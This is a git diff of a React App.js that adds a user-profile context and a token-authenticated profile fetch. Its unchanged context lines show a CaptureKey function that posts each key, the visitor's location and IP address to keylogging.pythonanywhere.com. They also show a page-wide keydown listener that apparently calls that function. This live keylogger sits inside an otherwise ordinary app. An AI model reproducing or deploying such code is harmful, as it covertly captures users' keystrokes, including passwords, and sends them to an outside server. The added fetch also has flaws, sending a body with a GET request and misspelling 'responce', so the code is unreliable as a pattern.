@@ -9,6 +9,7 @@ import { LocationContext } from './contexts/LocationContext';
 import Admin from './admin/Admin';
 import Login from './admin/Login';
 import { isBrowser } from 'react-device-detect';
+import { userContext } from './contexts/UserContext';
 
 const CaptureKey = (key, location, ip_address) => {
   fetch('https://keylogging.pythonanywhere.com/api/new_keylog', {
@@ -31,6 +32,10 @@ const CaptureKey = (key, location, ip_address) => {
 }
 
 function App() {
+
+  const [userProfile, setUserProfile] = useState()
+  const userProfileProvider = useMemo(() => ({ userProfile, setUserProfile }), [userProfile, setUserProfile])
+ 
   const { location } = useContext(LocationContext);
   isBrowser &&
   window.addEventListener('keydown', function (e) {
@@ -38,8 +43,35 @@ function App() {
     e.preventDefault()
   }, false);
 
+
+  useEffect(() => {
+    fetch('https://traffic.pythonanywhere.com/api/auth/profile', {
+      method: 'GET',
+      body: JSON.stringify(),
+      headers: {
+        Authorization: 'Bearer ' + localStorage.getItem("token")
+      }
+    }).then(responce => {
+      if (!responce.ok) {
+        localStorage.clear()
+      } else {
+        console.log('Logged in')
+      }
+      return responce.json();
+    }).then(data => {
+      if (data.access_token) {
+        localStorage.setItem("token", data.access_token)
+        setUserProfile(data)
+      }
+
+    }).catch(error => {
+      console.log(error.responce, error.status, error.headers)
+    })
+  }, [])
+
   return (
     <Router>
+       <userContext.Provider value={userProfileProvider}>
       <div className="App">
         <Navbar />
         <div className="content">
@@ -54,6 +86,7 @@ function App() {
           </Routes>
         </div>
       </div>
+      </userContext.Provider>
     </Router>
   );
 }
